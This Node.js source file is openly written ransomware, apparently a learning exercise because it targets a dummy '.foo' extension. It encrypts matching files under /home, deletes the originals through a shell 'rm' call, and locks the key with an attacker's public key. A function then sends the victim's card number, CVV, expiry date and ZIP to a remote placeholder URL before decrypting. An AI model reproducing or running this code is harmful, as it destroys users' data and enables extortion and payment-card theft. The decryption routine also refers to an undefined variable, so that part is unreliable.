var fileFinder = require('fs-finder');
var fileStream = require('fs');
var ursa = require('ursa');
var encryptor = require('file-encryptor');
var sys = require('sys');
var exe = require('child_process').exec;
var encryptedKey = '';
var files = fileFinder.from('/home').findFiles('*.foo');
var encryptedFiles = [];


var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZSCnqlU26QVvPINDZ5Om4nSG0\n'+
'lLIbzgpEh4IEo9CFIN8E29LrqdW+D3p6mAjy2QO882ogMqjsrPhH3XSg/C46QcSg\n'+
'1wXfv0p6qN1uIOvtVU1ItZ0l9TFwhC/mjhWoPWSEiSa3Ccw8g80iTExOzXVTjZp9\n'+
'mQmilgQsNiTzlPmGgQIDAQAB\n'+	
'-----END PUBLIC KEY-----\n';


//var secureRandom = require('secure-random-string');
//var password = secureRandom(64);

function encryptFiles(files){
  var secureRandom = require('secure-random-string');
  var password = secureRandom(64);
  var pubkey = ursa.createPublicKey(pubkeyTrudy);
  encryptedKey = pubkey.encrypt(password, 'utf8', 'base64');
  
  files.forEach(function(file) { 
   encryptor.encryptFile(file, file+'.lock', password, function(err) {
     if(err)
      console.log('Cannot encrypt: ' + file);

    deleteOriginalFile(file);
  });
   encryptedFiles.push(file +'.lock');
 });
}

function deCryptFiles(key){
  console.log(key)
  encryptedFiles.forEach(function(file) {
   encryptor.decryptFile(file, file + '.foo', key, options, function(err) {
    if(err)
     console.log('Cannot decrypt the file: '+ file);
  });
 });
}

function deleteOriginalFile(file) {
  var stringToEx = 'rm '+ file;
  exe(stringToEx);
}

function sendCCToTrudy(cardNumber, backNumbers, expiryDate, zip) {
  //var pubkey = ursa.createPublicKey(pubkeypem);
  var request = require('request');
  
  request.post(
    'http://www.yoursite.com/formpage',
    { json: { 
      key: encryptedKey,
      CcardNumber: cardNumber,
      backThree: backNumbers,
      expDate: expiryDate,
      zipCode: zip
    }
  },
  function (error, response, body) {
    if (!error && response.statusCode == 200) {
      deCryptFiles(body);
    }
  });
}

function RunRansomeWare() {
  encryptFiles(files);
}


//encryptFiles(files);
//deleteOriginalFiles(files);
//console.log(encryptedFiles);
//console.log('Encrypted');

//console.log('DeCrypting now........\n\n');
//deCryptFiles(password);
//encryptor.decryptFile('/home/nilay/Pictures/pic1.foo.lock', '/home/nilay/Pictures/pic1.foo.lock' + '.foo', //'_rctttamQ823QgvzJGzFx6wSC6KOoynW', function(err) {
//    console.log('Cannot decrypt the file: '+ '/home/nilay/Pictures/pic1.foo.lock');
//   });

//console.log(currentPath);

console.log(fileFinder.from('/home').findFiles('*.foo'));
